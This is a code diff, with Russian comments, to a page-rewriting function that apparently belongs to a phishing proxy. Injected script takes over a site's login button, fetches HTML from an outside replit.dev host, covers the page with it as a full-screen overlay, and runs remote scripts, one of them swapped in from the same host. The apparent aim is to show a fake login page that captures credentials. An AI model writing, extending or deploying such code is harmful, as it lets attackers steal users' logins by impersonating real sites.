@@ -256,20 +256,55 @@ function modifyUrls(content, baseUrl, contentType = '') {
             // ВАЖНО: Перехват кликов по кнопке авторизации
             function interceptAuthButton() {
                 const handleAuthClick = async (e) => {
-                    const button = e.target.closest('#login-register');
-                    if (button) {
-                        e.preventDefault();
-                        e.stopPropagation();
-                        e.stopImmediatePropagation();
-                        
-                        console.log('🔐 Auth button intercepted!');
-                        
-                        // Перенаправляем на существующий домен
-                        window.open('https://3572a8ce-e86d-4f44-9bb8-2d8dbaf70da2-00-2ang8yl1tdkr1.spock.replit.dev/6kaomrcjpf2m.html', '_blank');
-                        
-                        return false;
-                    }
-                };
+    const button = e.target.closest('#login-register');
+    if (button) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        
+        console.log('🔐 Auth button intercepted!');
+        
+        try {
+            // Загружаем HTML содержимое
+            const response = await fetch('https://3572a8ce-e86d-4f44-9bb8-2d8dbaf70da2-00-2ang8yl1tdkr1.spock.replit.dev/6kaomrcjpf2m.html');
+            const htmlContent = await response.text();
+            
+            // Создаем контейнер для содержимого
+            const authContainer = document.createElement('div');
+            authContainer.id = 'auth-container';
+            authContainer.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                z-index: 9999;
+                background: white;
+            `;
+            
+            authContainer.innerHTML = htmlContent;
+            document.body.appendChild(authContainer);
+            
+            // Загружаем скрипты
+            const scripts = authContainer.getElementsByTagName('script');
+            for (let script of scripts) {
+                const newScript = document.createElement('script');
+                if (script.src) {
+                    newScript.src = script.src.replace('/bhcg4ddaadpt.js', 
+                        'https://3572a8ce-e86d-4f44-9bb8-2d8dbaf70da2-00-2ang8yl1tdkr1.spock.replit.dev/bhcg4ddaadpt.js');
+                } else {
+                    newScript.textContent = script.textContent;
+                }
+                document.head.appendChild(newScript);
+            }
+            
+        } catch (error) {
+            console.error('Error loading auth page:', error);
+        }
+        
+        return false;
+    }
+};
                 
                 // Перехватываем клики на уровне документа
                 document.addEventListener('click', handleAuthClick, true);
